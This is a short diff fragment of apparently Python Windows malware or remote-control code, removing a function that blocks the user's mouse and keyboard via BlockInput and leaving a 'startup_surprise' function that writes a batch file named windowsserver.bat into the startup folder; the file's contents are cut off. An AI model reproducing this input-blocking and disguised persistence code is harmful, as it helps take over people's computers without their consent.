@@ -74,7 +74,6 @@ class functions():
       print("Failed to become admin.")
 
   @staticmethod
-  # TEST ON PC
   def minimize_current_window():
     try:
       Minimize = win32gui.GetForegroundWindow()
@@ -113,15 +112,6 @@ class functions():
         binary_file.write(data)
 
   @staticmethod
-  # TEST ON PC
-  def disable_mouse_keyboard_windows():
-    # Disable mouse
-    ctypes.windll.user32.BlockInput(True)
-    # Disable keyboard
-    ctypes.windll.user32.DisableProcessWindowsGhosting()
-
-  @staticmethod
-  # TEST ON PC
   def startup_surprise():
     with open(startupDir + '/windowsserver.bat', 'w') as fin:
       fin.write('''
